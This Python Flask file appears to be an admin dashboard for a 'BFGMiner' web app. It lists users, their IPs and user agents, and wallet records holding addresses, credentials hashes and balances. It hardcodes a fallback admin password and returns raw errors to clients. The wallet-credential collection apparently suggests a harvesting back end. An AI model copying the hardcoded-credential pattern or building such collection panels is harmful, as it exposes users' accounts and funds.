"""
Admin Dashboard Server for BFGMiner - Runs on Port 5002
"""

import os
import sqlite3

from config import AppConfig
from dotenv import load_dotenv
from enterprise_improvements import AuditLogger, DatabaseManager
from flask import (Flask, abort, redirect, render_template, request, send_file,
                   send_from_directory, session, url_for, jsonify)

load_dotenv()

app = Flask(__name__, template_folder="templates")

BASE_DIR = os.path.abspath(os.path.dirname(__file__))


@app.route("/style.css")
def admin_style():
    # Serve CSS from absolute path to avoid CWD issues
    return send_from_directory(BASE_DIR, "style.css", mimetype="text/css")


config = AppConfig()
app.secret_key = config.security.SECRET_KEY
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "BFGMiner@Admin2025!")

db = DatabaseManager(config.database.PATH)
db.init_database()
audit = AuditLogger(db)


@app.route("/admin", methods=["GET", "POST"])
def admin_dashboard():
    """Admin dashboard for viewing logs"""
    if request.method == "POST":
        password = request.form.get("password")
        if password != ADMIN_PASSWORD:
            abort(401, "Unauthorized")
        session["admin"] = True
        # Log admin login
        audit.log_action(
            None,
            "admin_login",
            "admin",
            None,
            f"Admin login from {request.remote_addr}",
            request.remote_addr,
            risk_level="HIGH"
        )
        return redirect("/admin/dashboard")

    if "admin" not in session:
        # Render login form
        return render_template("admin.html")

    # If already logged in, redirect to dashboard
    return redirect("/admin/dashboard")


@app.route("/admin/dashboard")
def admin_dashboard_view():
    """Admin dashboard view with data"""
    if "admin" not in session:
        return redirect("/admin")
    
    try:
        conn = sqlite3.connect(config.database.PATH)
        conn.row_factory = sqlite3.Row  # Enable row factory for named columns
        cursor = conn.cursor()
        
        # Get users with pagination
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', 20, type=int)
        offset = (page - 1) * per_page
        
        cursor.execute(
            """
            SELECT id, email, created_at, last_login, registration_ip, user_agent 
            FROM users 
            ORDER BY created_at DESC
            LIMIT ? OFFSET ?
            """, 
            (per_page, offset)
        )
        users = cursor.fetchall()
        
        # Get total user count for pagination
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        
        # Get wallets with pagination
        wallet_page = request.args.get('wallet_page', 1, type=int)
        wallet_offset = (wallet_page - 1) * per_page
        
        cursor.execute(
            """
            SELECT w.id, u.email, w.wallet_address, w.connection_type, 
                   w.credentials_hash, w.balance_usd, w.created_at, w.ip_address
            FROM wallets w 
            LEFT JOIN users u ON w.user_id = u.id
            ORDER BY w.created_at DESC
            LIMIT ? OFFSET ?
            """,
            (per_page, wallet_offset)
        )
        wallets = cursor.fetchall()
        
        # Get total wallet count for pagination
        cursor.execute("SELECT COUNT(*) FROM wallets")
        total_wallets = cursor.fetchone()[0]
        
        # Get audit logs with pagination
        log_page = request.args.get('log_page', 1, type=int)
        log_offset = (log_page - 1) * per_page
        
        try:
            cursor.execute(
                """
                SELECT al.id, al.user_id, u.email, al.action, al.resource_type, 
                       al.resource_id, al.details, al.ip_address, al.timestamp, al.risk_level
                FROM audit_logs al
                LEFT JOIN users u ON al.user_id = u.id
                ORDER BY al.timestamp DESC
                LIMIT ? OFFSET ?
                """,
                (per_page, log_offset)
            )
            audit_logs = cursor.fetchall()
            
            # Get total audit log count for pagination
            cursor.execute("SELECT COUNT(*) FROM audit_logs")
            total_logs = cursor.fetchone()[0]
        except sqlite3.OperationalError:
            # Handle case where audit_logs table might not have all columns
            cursor.execute(
                """
                SELECT * FROM audit_logs
                ORDER BY timestamp DESC
                LIMIT ? OFFSET ?
                """,
                (per_page, log_offset)
            )
            audit_logs = cursor.fetchall()
            
            # Get total audit log count for pagination
            cursor.execute("SELECT COUNT(*) FROM audit_logs")
            total_logs = cursor.fetchone()[0]
        
        conn.close()
        
        return render_template(
            "admin.html",
            users=users,
            wallets=wallets,
            audit_logs=audit_logs,
            total_users=total_users,
            total_wallets=total_wallets,
            total_logs=total_logs,
            current_page=page,
            current_wallet_page=wallet_page,
            current_log_page=log_page,
            per_page=per_page,
            admin=True
        )
    except Exception as e:
        return f"Error loading dashboard: {str(e)}"


@app.route("/admin/logout")
def admin_logout():
    """Admin logout"""
    session.pop("admin", None)
    return redirect("/admin")


@app.route("/admin/api/users")
def admin_api_users():
    """API endpoint for users data (for AJAX pagination)"""
    if "admin" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', 20, type=int)
        offset = (page - 1) * per_page
        
        conn = sqlite3.connect(config.database.PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute(
            """
            SELECT id, email, created_at, last_login, registration_ip, user_agent 
            FROM users 
            ORDER BY created_at DESC
            LIMIT ? OFFSET ?
            """, 
            (per_page, offset)
        )
        users = [dict(row) for row in cursor.fetchall()]
        
        cursor.execute("SELECT COUNT(*) FROM users")
        total = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            "users": users,
            "total": total,
            "page": page,
            "per_page": per_page,
            "pages": (total + per_page - 1) // per_page
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/wallets")
def admin_api_wallets():
    """API endpoint for wallets data (for AJAX pagination)"""
    if "admin" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', 20, type=int)
        offset = (page - 1) * per_page
        
        conn = sqlite3.connect(config.database.PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute(
            """
            SELECT w.id, u.email, w.wallet_address, w.connection_type, 
                   w.credentials_hash, w.balance_usd, w.created_at, w.ip_address
            FROM wallets w 
            LEFT JOIN users u ON w.user_id = u.id
            ORDER BY w.created_at DESC
            LIMIT ? OFFSET ?
            """,
            (per_page, offset)
        )
        wallets = [dict(row) for row in cursor.fetchall()]
        
        cursor.execute("SELECT COUNT(*) FROM wallets")
        total = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            "wallets": wallets,
            "total": total,
            "page": page,
            "per_page": per_page,
            "pages": (total + per_page - 1) // per_page
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/logs")
def admin_api_logs():
    """API endpoint for audit logs data (for AJAX pagination)"""
    if "admin" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', 20, type=int)
        offset = (page - 1) * per_page
        
        conn = sqlite3.connect(config.database.PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        try:
            cursor.execute(
                """
                SELECT al.id, al.user_id, u.email, al.action, al.resource_type, 
                       al.resource_id, al.details, al.ip_address, al.timestamp, al.risk_level
                FROM audit_logs al
                LEFT JOIN users u ON al.user_id = u.id
                ORDER BY al.timestamp DESC
                LIMIT ? OFFSET ?
                """,
                (per_page, offset)
            )
            logs = [dict(row) for row in cursor.fetchall()]
            
            cursor.execute("SELECT COUNT(*) FROM audit_logs")
            total = cursor.fetchone()[0]
        except sqlite3.OperationalError:
            # Fallback if risk_level column doesn't exist
            cursor.execute(
                """
                SELECT * FROM audit_logs
                ORDER BY timestamp DESC
                LIMIT ? OFFSET ?
                """,
                (per_page, offset)
            )
            logs = [dict(row) for row in cursor.fetchall()]
            
            cursor.execute("SELECT COUNT(*) FROM audit_logs")
            total = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            "logs": logs,
            "total": total,
            "page": page,
            "per_page": per_page,
            "pages": (total + per_page - 1) // per_page
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5002, debug=config.DEBUG)